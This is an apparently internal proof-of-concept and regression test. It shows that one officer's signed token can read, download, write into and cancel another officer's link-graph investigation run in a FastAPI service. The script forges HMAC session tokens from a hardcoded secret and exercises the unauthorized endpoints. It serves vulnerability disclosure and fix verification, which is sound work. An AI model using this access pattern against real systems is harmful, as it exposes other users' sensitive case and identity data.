"""PoC: cross-officer IDOR on run objects.

Officer A starts a demo link-graph run. Officer B (a fully valid, signed host token,
different identity) reads everything under A's run_id. The run_id also appears in the
global list endpoint for every caller. No per-officer ownership check exists anywhere.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import sys
import time

from fastapi import FastAPI
from fastapi.testclient import TestClient

from sherlocks.api.auth import SessionAuth
from sherlocks.api.linkgraph import build_router
from sherlocks.linkgraph.runs import memory_manager
from sherlocks.render._reportlib import _ensure_on_path
from sherlocks.settings import load_settings

SECRET = "shared-with-laravel"


def host_token(user: str, secret: str = SECRET, ttl: int = 900) -> str:
    def b64(raw: bytes) -> str:
        return base64.urlsafe_b64encode(raw).decode().rstrip("=")

    payload = json.dumps({"u": user, "exp": int(time.time()) + ttl}, separators=(",", ":")).encode()
    return f"{b64(payload)}.{b64(hmac.new(secret.encode(), payload, hashlib.sha256).digest())}"


def main() -> int:
    s = load_settings()
    _ensure_on_path(s.app.report_app_src)
    s.ollama.enabled = False
    s.llm.enabled = False
    s.osint.enabled = False
    s.api.api_key = None
    s.auth.enabled = True
    s.auth.password = None
    s.auth.password_sha256 = None
    s.auth.secret = SECRET

    mgr = memory_manager(s)
    app = FastAPI()
    app.include_router(build_router(s, lambda: mgr, SessionAuth(s)))
    client = TestClient(app)
    prefix = s.api.prefix

    # --- Officer A starts a run (demo backend, no external services needed) ---------
    tok_a, tok_b = host_token("officer.101"), host_token("officer.202")
    created = client.post(f"{prefix}/graph/runs", headers={"X-Session-Token": tok_a},
                          json={"cnic": "99999-0000001-1", "depth": 2, "max_persons": 15,
                                "backend": "demo"})
    assert created.status_code == 202, created.text
    run_id = created.json()["run_id"]
    print(f"[+] Officer A (officer.101) started run {run_id}")

    # The run builds in a background thread; wait for it to finish.
    import time as _t
    for _ in range(60):
        if mgr.get(run_id)["status"] in {"completed", "failed", "cancelled"}:
            break
        _t.sleep(0.5)
    print(f"[*] A's run finished with status: {mgr.get(run_id)['status']}")

    # --- Officer B reads A's run with no relationship whatsoever ----------------------
    r = client.get(f"{prefix}/graph/runs/{run_id}", headers={"X-Session-Token": tok_b})
    print(f"[*] B GET runs/{run_id[:8]}... -> {r.status_code}, created_by={r.json().get('created_by')!r}")
    assert r.status_code == 200, "expected 200 (IDOR), got %s" % r.status_code
    nodes = (r.json().get("graph") or {}).get("nodes", [])
    cnics = [n for n in nodes if "cnic" in json.dumps(n).lower()]
    print(f"[*] B read {len(nodes)} graph nodes from A's run; {len(cnics)} mention a CNIC")
    print("    sample node:", json.dumps(nodes[0])[:300] if nodes else "(none)")

    # --- B sees A's run in the global list -------------------------------------------
    listing = client.get(f"{prefix}/graph/runs", headers={"X-Session-Token": tok_b})
    ids = [row["id"] for row in listing.json()]
    print(f"[*] B GET /graph/runs -> {listing.status_code}, {len(ids)} run(s) listed, "
          f"A's run present: {run_id in ids}")

    # --- B reads case data, documents, export, PDF, brief under A's run ---------------
    case = client.get(f"{prefix}/graph/runs/{run_id}/case",
                      headers={"X-Session-Token": tok_b}).json()
    doc_ids = [d.get("id") for d in (case.get("documents") or [])]
    print(f"[*] B GET runs/{run_id[:8]}.../case -> 200, {len(doc_ids)} documents, "
          f"{len(case.get('facts') or [])} facts")
    if doc_ids:
        doc = client.get(f"{prefix}/graph/runs/{run_id}/documents/{doc_ids[0]}",
                         headers={"X-Session-Token": tok_b}).json()
        print(f"[*] B GET runs/{run_id[:8]}.../documents/{doc_ids[0]} -> 200, "
              f"{len(doc.get('text') or '')} chars from {doc.get('source')!r}")
    export = client.get(f"{prefix}/graph/runs/{run_id}/export",
                        headers={"X-Session-Token": tok_b})
    print(f"[*] B GET runs/{run_id[:8]}.../export -> {export.status_code}, "
          f"{len((json.loads(export.content).get('graph') or {}).get('nodes') or [])} nodes")
    pdf = client.get(f"{prefix}/graph/runs/{run_id}/report.pdf",
                     headers={"X-Session-Token": tok_b})
    print(f"[*] B GET runs/{run_id[:8]}.../report.pdf -> {pdf.status_code}, "
          f"{len(pdf.content)} bytes of the case report")
    persons = [n for n in nodes if n.get("kind") == "person"]
    if persons:
        brief = client.get(f"{prefix}/graph/runs/{run_id}/persons/{persons[0]['id']}/brief",
                           headers={"X-Session-Token": tok_b})
        print(f"[*] B GET runs/{run_id[:8]}.../persons/{persons[0]['id'][:8]}.../brief -> {brief.status_code}")

    # --- B can even write: upload an evidence file into A's run -----------------------
    up = client.post(f"{prefix}/graph/runs/{run_id}/uploads",
                     headers={"X-Session-Token": tok_b},
                     files={"file": ("b_note.txt", b"planted by officer B")},
                     data={"note": "cross-run write"}).status_code
    print(f"[*] B POST /graph/runs/{run_id[:8]}.../uploads -> {up} (write into A's run)")

    # --- B can address A's run for cancel (availability) -------------------------------
    cancel = client.post(f"{prefix}/graph/runs/{run_id}/cancel",
                         headers={"X-Session-Token": tok_b}).status_code
    print(f"[*] B POST /graph/runs/{run_id[:8]}.../cancel -> {cancel}")

    # --- owner still has full access (regression check for the fix) -------------------
    own = client.get(f"{prefix}/graph/runs/{run_id}", headers={"X-Session-Token": tok_a})
    print(f"[*] A (owner) GET runs/{run_id[:8]}... -> {own.status_code}")
    own_list = client.get(f"{prefix}/graph/runs", headers={"X-Session-Token": tok_a}).json()
    print(f"[*] A (owner) GET /graph/runs -> sees own run: {run_id in [x['id'] for x in own_list]}")

    # --- post-fix expectation: the cross-officer reads must be 403/404 ---------------
    blocked = r.status_code in (403, 404)
    print(f"\n[{'OK' if blocked else 'VULN'}] Cross-officer read returned {r.status_code} "
          f"(fixed build expects 403/404; vulnerable build returned 200 with A's data).")
    return 0


if __name__ == "__main__":
    sys.exit(main())